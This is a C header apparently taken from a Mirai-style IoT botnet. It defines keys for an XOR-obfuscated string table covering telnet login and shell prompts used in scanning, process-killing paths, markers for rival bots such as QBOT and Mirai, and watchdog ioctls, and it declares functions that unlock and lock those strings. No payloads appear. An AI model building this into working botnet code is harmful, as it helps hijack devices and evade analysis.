#pragma once

#include <unistd.h>
#include <stdint.h>
#include <stdarg.h>
struct table_value
{
    char *val;
    uint16_t val_len;
};

/* Defining Table Keys */
#define XOR_SCAN_PORT 1

#define XOR_NULL 2

#define XOR_IOCTL_WATCH1 3
#define XOR_IOCTL_WATCH2 4
#define XOR_IOCTL_WATCH3 5
#define XOR_IOCTL_WATCH4 6
#define XOR_IOCTL_WATCH5 7

#define XOR_SCAN_SHELL 10
#define XOR_SCAN_ENABLE 11
#define XOR_SCAN_SYSTEM 12
#define XOR_SCAN_LINUXSHELL 13
#define XOR_SCAN_BAH 14
#define XOR_SCAN_SH 15

#define XOR_SCAN_NCORRECT 16
#define XOR_SCAN_OGIN 17
#define XOR_SCAN_ENTER 18
#define XOR_SCAN_ASSWORD 19

#define XOR_SCAN_QUERY 20
#define XOR_SCAN_RESP 21

#define XOR_KILL_PROC 22
#define XOR_KILL_EXE 23
#define XOR_KILL_FD 24
#define XOR_KILL_MAPS 25
#define XOR_KILL_TCP 26

#define XOR_MEM_HTTP 27
#define XOR_MEM_QBOT1 28
#define XOR_MEM_QBOT2 29
#define XOR_MEM_QBOT3 30
#define XOR_MEM_MIRAI 31
#define XOR_MEM_SELF_EXE 32
#define XOR_MEM_UPX 33
#define XOR_MEM_ROUTE 34
#define XOR_MEM_RC 35
#define XOR_MEM_BINSH 36

#define XOR_EXEC_SUCCESS 37
#define XOR_RANDOM 38

#define MAX_XOR_KEYS 39


void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t);
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
